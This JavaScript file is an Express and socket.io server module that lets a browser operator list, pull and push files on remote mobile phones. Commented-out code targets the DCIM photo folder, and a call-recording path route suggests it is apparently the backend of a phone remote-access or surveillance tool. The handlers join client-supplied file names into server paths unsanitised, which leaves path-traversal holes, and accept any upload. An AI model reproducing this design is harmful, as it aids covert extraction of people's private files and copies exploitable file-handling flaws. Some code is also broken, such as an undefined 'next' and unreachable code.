require('rootpath')();

const path = require('path');
const errcode = require('err-code');
const multer = require('multer');
const mkdirp = require('mkdirp');

async function uploadFiles(req, res, next) {
    const id = String(req.body.id);
    const filename = String(req.body.filename);
    const action = String(req.body.action);

    const app = req.app;

    const { Mobile } = app.db;
    const mobile = await Mobile.findByPk(id);
    if (!mobile)
        return next(errcode(new Error('not found'), { status: 404 }));;

    const socket = app.socket;
    const mobileSocket = socket.getMobileMain(mobile.id);
    const room = mobileSocket != null ? mobileSocket.room : null;
    if (!room)
        return next(errcode(new Error('not found'), { status: 404 }));

    socket.io.to(room).emit('upload_filelist', { filename, action });

    res.json({ id: mobile.id });
}

async function actionClickFolder(req, id, filename) {
    const action = "";

    const { Mobile } = req.app.db;
    const mobile = await Mobile.findByPk(id);
    if (!mobile)
        return next(errcode(new Error('not found'), { status: 404 }));;

    const socket = req.app.socket;
    const mobileSocket = socket.getMobileMain(mobile.id);
    const room = mobileSocket != null ? mobileSocket.room : null;
    if (!room)
        return next(errcode(new Error('not found'), { status: 404 }));

    socket.io.to(room).emit('upload_filelist', { filename, action });

}

async function filelist(req, res, next) {
    const mobileId = String(req.body.id);
    let files = req.body.files || [];
    const parent_path = String(req.body.parent_path);
    const current_path = String(req.body.current_path);
    const storage_path = String(req.body.storage_path);
    
    // for (var i = 0; i < files.length; i++) {
    //     if (files[i].name == "DCIM") {
    //         await actionClickFolder(req, mobileId, files[i].absoluteDir);
    //         return res.json({ id: mobileId });
    //     }
    // }
    // files = files.filter(file => {
    //     if (file.absoluteDir.includes("DCIM")) {
    //         return true
    //     } else {
    //         return false;
    //     }
    // });
    files = files
        .map(file => ({
            name: String(file.name),
            is_dir: file.isDir,
            file_type: file.isDir ? "File folder" : String(file.name).substring(file.name.length - 3),
            absolute_dir: String(file.absoluteDir),
            current_path: String(file.currentPath)
        }));

    res.json({ id: mobileId });

    req.app.socket.io.to('controls').emit('filelist_updated', { mobileId, files, parent_path, current_path, storage_path });
}

async function requestDownloadFile(req, res, next) {
    const mobileId = String(req.body.id);
    const filename = String(req.body.filename);

    const app = req.app;

    const { Mobile } = app.db;
    const mobile = await Mobile.findByPk(mobileId);
    if (!mobile)
        return next(errcode(new Error('not found'), { status: 404 }));;

    const socket = app.socket;
    const mobileSocket = socket.getMobileMain(mobileId);
    const room = mobileSocket != null ? mobileSocket.room : null;
    if (!room)
        return next(errcode(new Error('not found'), { status: 404 }));

    socket.io.to(room).emit('download_file', { filename });

    res.json({ id: mobileId });
}

function saveDownloadFile() {
    const storage = multer.diskStorage({
        destination(req, file, cb) {
            const mobileId = String(req.body.id);
            if (mobileId == null)
                return cb(errcode(new Error('mobile id is required'), { status: 400 }));

            const dir = path.join(req.app.get('download.mobiles.dir'), mobileId);
            mkdirp.sync(dir);
            cb(null, dir);
        },
        filename(req, file, cb) {
            return cb(null, req.body.fileName)
        }
    });
    const upload = multer({
        storage,
        fileFilter(req, file, cb) {
            cb(null, true);
        }
    }).any();

    return (req, res, next) => {
        upload(req, res, err => {
            if (err)
                req.app.logger.error(err);
            next(err);
        });
    }
}

async function files(req, res, next) {
    const mobileId = String(req.body.id);
    const file_name = String(req.body.fileName);

    res.json({ id: mobileId });
    req.app.socket.io.to('controls').emit('file_download', { id: mobileId, file_name });
}

async function downloadFile(req, res) {
    const mobileId = String(req.params.mobile);
    const file_name = String(req.params.filename);
    const dir_name = path.join(req.app.get('download.mobiles.dir'), mobileId);
    res.download(path.join(dir_name, file_name));
}

function saveUploadFile() {
    const storage = multer.diskStorage({
        destination(req, file, cb) {
            const mobileId = String(req.body.id);
            if (mobileId == null)
                return cb(errcode(new Error('mobile id is required'), { status: 400 }));

            const dir = path.join(req.app.get('upload.mobiles.dir'), mobileId);
            mkdirp.sync(dir);
            cb(null, dir);
        },
        filename(req, file, cb) {
            return cb(null, file.originalname)
        }
    });
    const upload = multer({
        storage,
        fileFilter(req, file, cb) {
            cb(null, true);
        }
    }).any();

    return (req, res, next) => {
        upload(req, res, err => {
            if (err)
                req.app.logger.error(err);
            next(err);
        });
    }
}

async function sendFile(req, res, next) {
    const mobileId = String(req.body.id);

    const app = req.app;

    const { Mobile } = app.db;
    const mobile = await Mobile.findByPk(mobileId);
    if (!mobile)
        return next(errcode(new Error('not found'), { status: 404 }));

    const socket = app.socket;
    const mobileSocket = socket.getMobileMain(mobileId);
    const room = mobileSocket != null ? mobileSocket.room : null;
    if (!room)
        return next(errcode(new Error('not found'), { status: 404 }));

    const file_path = String(req.body.file_path);
    const file_name = String(req.body.file_name);
    // socket.io.to(room).emit('upload_file', { file_path, file_name });

    res.json({ id: mobileId });
}

async function setCallRecPath(req, res) {
    return res.json({id: req.body.id});
    
    const id = String(req.body.id);
    const currentPath = req.body.current_path != null ? String(req.body.current_path) : undefined;
    const storagePath = req.body.storage_path != null ? String(req.body.storage_path) : undefined;
    var filePath;
    var len1 = 0;
    var len2 = 0;

    if (currentPath != 'undefined' && storagePath != 'undefined') {
        len1 = currentPath.length;
        len2 = storagePath.length;
    }

    if (len1 > len2) {
        filePath = currentPath.substring(len2, len1);
    } else {
        filePath = currentPath;
    }

    const { Mobile } = req.app.db;
    const mobile = await Mobile.save({ id, filePath });

    res.json({ id: mobile.id });
}

async function uploadFile(req, res, next) {
    const mobileId = String(req.body.id);
    const fileName = String(req.body.file_name);
    const dir = path.join(req.app.get('upload.mobiles.dir'), mobileId);
    const options = {
        root: dir,
        dotfiles: 'deny',
        headers: {
            'x-timestamp': Date.now(),
            'x-sent': true
        }
    };

    res.sendFile(fileName, options, function (err) {
        if (err) {
            next(err);
        } else {
            console.log('Sent:', fileName);
        }
    });
}

module.exports = app => {

    app.set('download.mobiles.dir', path.join(app.get('download.dir'), 'mobiles'));
    app.set('upload.mobiles.dir', path.join(app.get('upload.dir'), 'mobiles'));
    //
    // +-----------+                                    +--------+                              +--------+
    // |           | POST /api/mobile/upload_files      |        | socket.io upload_filelist    |        |
    // |           +----------------------------------->|        +------------------------->    |        |
    // |  Control  |<-----------------------------------| Server |                              | Mobile |
    // | (Browser) |     socket.io filelist_updated     | (Node) | POST /api/mobile/filelist    |  (App) |
    // |           |<-----------------------------------|        |<-------------------------    |        |
    // |           |                                    |        |------------------------->    |        |
    // +-----------+                                    +--------+                              +--------+
    //

    app.api.route('/mobile/upload_files').post(uploadFiles);
    app.api.route('/mobile/filelist').post(filelist);

    //
    // +-----------+                                              +--------+                               +--------+
    // |           |         POST /api/mobile/download_file       |        | socket.io download_file       |        |
    // |           +--------------------------------------------->|        +------------------------->     |        |
    // |  Control  |<---------------------------------------------| Server |                               | Mobile |
    // | (Browser) |           socket.io file_download            | (Node) | POST /api/mobile/file         |  (App) |
    // |           |<---------------------------------------------|        |<-------------------------     |        |
    // |           |                                              |        |                               |        |
    // |           |get /mobiles/:mobile/:filename/download_file  |        |                               |        |
    // |           |--------------------------------------------->|        |                               |        |
    // +-----------+                                              +--------+                               +--------+
    //

    app.api.route('/mobile/download_file').post(requestDownloadFile);
    app.api.route('/mobile/file').post(saveDownloadFile(), files);
    app.api.route('/mobiles/:mobile/:filename/download_file').get(downloadFile);

    //
    // +-----------+                                   +--------+                               +--------+
    // |           | POST /api/mobile/send_file        |        | socket.io upload_file         |        |
    // |           +---------------------------------->|        +------------------------->     |        |
    // |  Control  |<----------------------------------| Server |                               | Mobile |
    // | (Browser) |     socket.io filelist_updated    | (Node) | POST /api/mobile/uploadfile   |  (App) |
    // |           |<----------------------------------|        |<-------------------------     |        |
    // |           |                                   |        |------------------------->     |        |
    // +-----------+                                   +--------+                               +--------+
    //

    app.api.route('/mobile/send_file').post(saveUploadFile(), sendFile);
    app.api.route('/mobile/uploadfile').post(uploadFile);
    app.api.route('/mobile/call_rec_path').post(setCallRecPath);

};